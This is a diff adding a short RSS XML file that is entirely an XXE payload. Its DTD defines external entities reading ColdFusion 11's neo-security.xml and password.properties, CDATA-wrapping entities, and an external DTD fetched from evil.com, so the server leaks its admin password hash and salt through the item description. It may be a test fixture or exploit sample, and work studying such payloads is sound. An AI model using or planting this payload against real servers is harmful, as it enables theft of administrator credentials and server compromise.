@@ -1,0 +1,22 @@
+<?xml version="1.0" encoding="UTF-8" ?><!DOCTYPE rss [
+<!ENTITY % xxe-hash SYSTEM
+"file:///ColdFusion11/cfusion/lib/neo-security.xml">
+<!ENTITY % xxe-salt SYSTEM
+"file:///ColdFusion11/cfusion/lib/password.properties">
+<!ENTITY % end "]]>" >
+<!ENTITY % start "<![CDATA[" >
+<!ENTITY % dtd SYSTEM "http://evil.com/cdata-xxe.dtd">
+%dtd;
+]>
+<rss version="2.0">
+  <channel>
+    <title>T</title>
+    <link>L</link>
+    <description>D</description>
+    <item>
+      <title>TT</title>
+      <link>LL</link>
+      <description>&all;</description>
+    </item>
+  </channel>
+</rss>
